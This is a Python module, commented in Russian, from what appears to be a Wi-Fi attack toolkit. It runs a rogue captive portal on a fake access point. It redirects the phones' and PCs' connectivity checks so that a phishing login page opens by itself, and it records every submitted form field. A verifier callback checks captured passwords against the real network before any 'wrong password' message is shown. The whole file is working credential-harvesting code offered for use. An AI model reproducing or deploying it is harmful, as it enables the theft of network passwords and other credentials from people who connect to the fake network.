"""Портал-ловушка: шаблоны, многошаговые сценарии, сбор полей.

Сервер слушает только адрес шлюза фейк-точки. Captive-детекторы Android/iOS/
Windows получают 302 на портал, поэтому окно авторизации открывается само.
Все поля формы (не только пароль) уходят в колбэк; вердикт колбэка управляет
следующим шагом — «неверный пароль» показывается только после реальной проверки.
"""

from __future__ import annotations

import html
import json
import re
import threading
import time
import urllib.parse
from dataclasses import dataclass, field
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Callable

from .base import WilfiError, ensure_dir

PORTALS_DIR = Path(__file__).resolve().parent.parent / "portals"
CAPTIVE_PATHS = {
    "/generate_204",
    "/gen_204",
    "/hotspot-detect.html",
    "/library/test/success.html",
    "/ncsi.txt",
    "/connecttest.txt",
    "/redirect",
    "/canonical.html",
    "/success.txt",
}
PLACEHOLDER = re.compile(r"\{\{([A-Z_]+)\}\}")


@dataclass
class Template_:
    name: str
    lang: str
    title: str
    steps: list[str]
    dir: Path
    fields_expected: list[str] = field(default_factory=list)

    def meta(self) -> dict:
        return {"name": self.name, "lang": self.lang, "title": self.title, "steps": len(self.steps)}


@dataclass
class Submission:
    ts: float
    step: int
    fields: dict[str, str]
    user_agent: str
    verdict: str = "pending"


def list_templates() -> list[dict]:
    """Шаблоны ищутся рекурсивно: и плоские (portals/<id>), и сгруппированные (portals/generic/<id>)."""
    out: list[dict] = []
    if not PORTALS_DIR.is_dir():
        return out
    for meta_file in sorted(PORTALS_DIR.rglob("meta.json")):
        directory = meta_file.parent
        meta = read_meta(directory)
        if not meta:
            continue
        meta["id"] = directory.relative_to(PORTALS_DIR).as_posix()
        out.append(meta)
    return out


def read_meta(directory: Path) -> dict | None:
    meta_file = directory / "meta.json"
    if not meta_file.is_file():
        return None
    try:
        data = json.loads(meta_file.read_text())
    except ValueError:
        return None
    steps = data.get("steps") or ["page.html"]
    return {
        "id": directory.name,
        "name": data.get("name", directory.name),
        "lang": data.get("lang", "ru"),
        "title": data.get("title", directory.name),
        "steps": steps,
        "vendor": data.get("vendor", ""),
        "fields": data.get("fields", []),
    }


def load_template(template_id: str) -> Template_:
    directory = PORTALS_DIR / template_id
    if not directory.is_dir():
        raise WilfiError(f"шаблон {template_id} не найден", code="no_template")
    meta = read_meta(directory)
    if not meta:
        raise WilfiError(f"у шаблона {template_id} нет meta.json", code="bad_template")
    for step in meta["steps"]:
        if not (directory / step).is_file():
            raise WilfiError(f"в шаблоне нет файла {step}", code="bad_template")
    return Template_(
        name=meta["name"], lang=meta["lang"], title=meta["title"],
        steps=meta["steps"], dir=directory, fields_expected=meta.get("fields", []),
    )


def install_custom(source: Path, name: str) -> dict:
    """Установка своего шаблона: один html или zip с шаблоном.

    Требование одно и жёсткое: в разметке должен быть input[type=password],
    иначе перехватывать нечего и портал выглядит как реклама.
    """
    target_dir = PORTALS_DIR / _slug(name)
    if target_dir.exists():
        raise WilfiError(f"шаблон {target_dir.name} уже есть", code="exists")
    ensure_dir(target_dir)
    if source.suffix.lower() == ".zip":
        import zipfile

        with zipfile.ZipFile(source) as zf:
            for member in zf.namelist():
                if member.startswith("/") or ".." in member:
                    continue
                zf.extract(member, target_dir)
        # если всё лежит в единственной вложенной папке — поднимаем наверх
        children = [c for c in target_dir.iterdir()]
        if len(children) == 1 and children[0].is_dir():
            nested = children[0]
            for item in nested.iterdir():
                item.rename(target_dir / item.name)
            nested.rmdir()
        page = next((p for p in target_dir.glob("*.htm*")), None)
        if not page:
            raise WilfiError("в архиве нет html", code="bad_template")
        html_text = page.read_text(errors="replace")
        steps = [page.name]
    else:
        html_text = source.read_text(errors="replace")
        (target_dir / "index.html").write_text(html_text)
        steps = ["index.html"]
    if not re.search(r"type=[\"']?password", html_text, re.I):
        raise WilfiError("в форме нет поля type=password", code="no_password_field")
    fields = re.findall(r"name=[\"']([\w\-\[\]]+)[\"']", html_text)
    meta = {
        "name": name,
        "lang": "ru" if re.search(r"[а-яА-Я]", html_text) else "en",
        "title": name,
        "steps": steps,
        "fields": [f for f in fields if f.lower() != "submit"][:10],
        "custom": True,
    }
    (target_dir / "meta.json").write_text(json.dumps(meta, ensure_ascii=False, indent=2))
    return meta


def _slug(text: str) -> str:
    return re.sub(r"[^a-z0-9\-]+", "-", text.lower()).strip("-") or "custom"


class Portal:
    """Один запущенный портал: шаблон, состояние шага, приёмники."""

    def __init__(self, template_id: str, ssid: str, vendor: str = "", lang: str = "ru"):
        self.template = load_template(template_id)
        self.ssid = ssid
        self.vendor = vendor
        self.lang = lang
        self.step = 0
        self.submissions: list[Submission] = []
        self.verdict: str = "pending"  # pending|ok|retry
        self.verifier: Callable[[dict[str, str]], str] | None = None
        self.server: ThreadingHTTPServer | None = None
        self.port = 0
        self.started_at = 0.0
        self._lock = threading.Lock()

    def render(self, step: int) -> bytes:
        files = self.template.steps
        index = min(step, len(files) - 1)
        raw = (self.template.dir / files[index]).read_text(errors="replace")
        values = {
            "SSID": html.escape(self.ssid),
            "VENDOR": html.escape(self.vendor),
            "LANG": self.lang,
            "TITLE": html.escape(self.template.title),
            "ACTION": "/submit",
            "STEP": str(index),
            "STATIC": "/static/",
        }
        rendered = PLACEHOLDER.sub(lambda m: values.get(m.group(1), ""), raw)
        return rendered.encode()

    def static_path(self, path: str) -> Path | None:
        target = (self.template.dir / path.lstrip("/")).resolve()
        if self.template.dir.resolve() in target.parents or target.parent == self.template.dir.resolve():
            return target if target.is_file() else None
        return None

    def accept(self, fields: dict[str, str], user_agent: str) -> str:
        with self._lock:
            sub = Submission(time.time(), self.step, fields, user_agent)
            self.submissions.append(sub)
            verdict = "pending"
            if self.verifier:
                try:
                    verdict = self.verifier(fields) or "pending"
                except Exception:
                    verdict = "pending"
            sub.verdict = verdict
            if verdict == "ok":
                self.step = len(self.template.steps) - 1
            elif verdict == "retry":
                self.step = 1 if len(self.template.steps) > 1 else 0
            self.verdict = verdict
            return verdict

    def summary(self) -> dict:
        return {
            "template": self.template.meta(),
            "ssid": self.ssid,
            "step": self.step,
            "verdict": self.verdict,
            "port": self.port,
            "started_at": self.started_at,
            "submissions": [
                {"ts": s.ts, "step": s.step, "fields": s.fields, "ua": s.user_agent, "verdict": s.verdict}
                for s in self.submissions
            ],
        }


def serve(portal: Portal, bind: str, port: int = 8080) -> ThreadingHTTPServer:
    handler = _make_handler(portal)

    class _Server(ThreadingHTTPServer):
        daemon_threads = True
        allow_reuse_address = True

    server = _Server((bind, port), handler)
    threading.Thread(target=server.serve_forever, kwargs={"poll_interval": 0.2}, daemon=True).start()
    portal.server = server
    portal.port = server.server_address[1]
    portal.started_at = time.time()
    return server


def stop(portal: Portal) -> None:
    if portal.server:
        portal.server.shutdown()
        portal.server.server_close()
        portal.server = None


def _make_handler(portal: Portal):
    class Handler(BaseHTTPRequestHandler):
        server_version = "wifikit-portal/1"
        protocol_version = "HTTP/1.1"

        def log_message(self, format: str, *args) -> None:  # noqa: A002
            pass

        # ------------------------------------------------------------------ GET
        def do_GET(self) -> None:  # noqa: N802
            path = urllib.parse.urlparse(self.path).path
            if path in CAPTIVE_PATHS:
                self._redirect("/")
                return
            if path.startswith("/static/"):
                target = portal.static_path(path[len("/static/"):])
                if target:
                    self._file(target)
                    return
                self._page(404, b"not found")
                return
            if path == "/" or path.startswith("/step"):
                self._page(200, portal.render(portal.step))
                return
            if path == "/success":
                self._page(200, portal.render(len(portal.template.steps) - 1))
                return
            # любой неизвестный путь = попытка выйти в интернет → на портал
            self._redirect("/")

        # ----------------------------------------------------------------- POST
        def do_POST(self) -> None:  # noqa: N802
            length = int(self.headers.get("Content-Length") or 0)
            body = self.rfile.read(min(length, 64 * 1024)).decode(errors="replace")
            ctype = (self.headers.get("Content-Type") or "").lower()
            fields: dict[str, str] = {}
            if "json" in ctype:
                try:
                    parsed = json.loads(body or "{}")
                    fields = {str(k): str(v) for k, v in parsed.items() if v is not None}
                except ValueError:
                    fields = {}
            else:
                parsed = urllib.parse.parse_qs(body, keep_blank_values=True)
                fields = {k: (v[0] if v else "") for k, v in parsed.items()}
            fields.pop("submit", None)
            verdict = portal.accept(fields, self.headers.get("User-Agent", ""))
            payload = {"verdict": verdict, "next": "/"}
            self._json(200, payload)

        # -------------------------------------------------------------- helpers
        def _page(self, code: int, body: bytes) -> None:
            self.send_response(code)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            self.wfile.write(body)

        def _json(self, code: int, data: dict) -> None:
            body = json.dumps(data).encode()
            self.send_response(code)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def _redirect(self, target: str) -> None:
            body = f'<meta http-equiv="refresh" content="0;url={target}">'.encode()
            self.send_response(302)
            self.send_header("Location", target)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def _file(self, target: Path) -> None:
            data = target.read_bytes()
            ctype = {
                ".css": "text/css", ".js": "application/javascript", ".png": "image/png",
                ".jpg": "image/jpeg", ".jpeg": "image/jpeg", ".svg": "image/svg+xml",
                ".woff2": "font/woff2", ".html": "text/html; charset=utf-8",
            }.get(target.suffix.lower(), "application/octet-stream")
            self.send_response(200)
            self.send_header("Content-Type", ctype)
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)

    return Handler
